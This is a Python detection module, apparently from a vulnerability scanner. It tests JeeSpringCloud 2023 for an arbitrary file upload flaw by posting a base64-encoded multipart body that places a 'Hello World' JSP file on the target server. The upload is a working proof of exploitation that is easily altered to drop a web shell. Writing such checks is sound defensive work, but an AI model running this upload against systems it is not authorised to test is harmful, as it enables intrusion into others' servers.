#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     JeeSpringCloud_2023_uploadfile.py
   Description :   JeeSpringCloud 2023 任意文件上传漏洞检测模块
   Author :       sule01u
   date：          2023/10/9
"""
import base64
import random
import requests
from urllib.parse import urljoin
from colorama import Fore
from utils.custom_headers import TIMEOUT, USER_AGENTS
from utils.logging_config import configure_logger

# 初始化日志记录
logger = configure_logger(__name__)

# CVE 编号或漏洞描述
CVE_ID = "JeeSpring_2023"

# 有效载荷（文件上传的内容）
PAYLOAD_BASE64 = b'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo='
PAYLOAD = base64.b64decode(PAYLOAD_BASE64)

# 目标上传路径
UPLOAD_PATH = 'static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/'

# HTTP 请求头
HEADERS = {
    'User-Agent': random.choice(USER_AGENTS),
    'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL',
    'Accept-Encoding': 'gzip, deflate',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8',
    'Connection': 'close'
}


def check(url, dns_domain="", proxies=None, session=None, timeout=TIMEOUT):
    """
    检测 JeeSpring Cloud 任意文件上传漏洞
    :param url: 目标 URL
    :param dns_domain: DNS 日志域名（不使用，仅保持接口一致性）
    :param proxies: 代理配置
    :param session: 复用的 Session 实例（可选）
    :param timeout: 请求超时时间（秒）
    :return: 如果存在漏洞，返回 (True, 详细信息字典)，否则返回 (False, {})
    """
    # 使用传入的 session，如果没有则创建新的 session
    session = session or requests.Session()
    
    target_url = urljoin(url, UPLOAD_PATH)
    
    try:
        # 准备上传文件
        files = {
            'file': ('test.jsp', PAYLOAD, 'application/octet-stream')
        }
        
        # 发送 POST 请求进行文件上传
        headers = HEADERS.copy()
        headers.update({
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
        })
        
        res = session.post(target_url, headers=headers, files=files, timeout=timeout, verify=False, proxies=proxies)

        # 获取 HTTP 状态码并输出调试信息
        code = res.status_code
        logger.debug(Fore.CYAN + f"[{code}]" + Fore.BLUE + f"[{res.headers}]", extra={"target": target_url})

        # 检查返回内容中是否包含文件上传成功的标志
        if 'jsp' in res.text and code == 200:
            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url})
            return True, {
                "CVE_ID": CVE_ID,
                "URL": target_url,
                "Details": f"{CVE_ID} vulnerability detected at {target_url}",
                "ResponseSnippet": res.text[:200] + "...."  # 仅截取前200字符作为报告片段
            }

        # 如果未检测到漏洞，返回 False
        logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
        return False, {}

    except (requests.Timeout, requests.ConnectionError, requests.RequestException) as e:
        # 捕获所有请求异常，并记录到日志
        logger.error(f"[Request Error：{e}]", extra={"target": target_url})
        return False, {}
    except Exception as e:
        # 捕获所有其他未知异常，并记录到日志
        logger.error(f"[Unknown Error：{e}]", extra={"target": target_url})
        return False, {}
    finally:
        # 如果 session 是本模块创建的，则关闭（否则保持复用的 session 不被关闭）
        if not session:
            session.close()


if __name__ == '__main__':
    # 测试用例
    proxy = {"http": "http://user:password@localhost:8080", "https": "http://user:password@localhost:8080"}

    # 测试 JeeSpring 2023 任意文件上传漏洞检测
    is_vul, res = check("http://localhost:8080/", proxies=proxy)
    print(is_vul, res)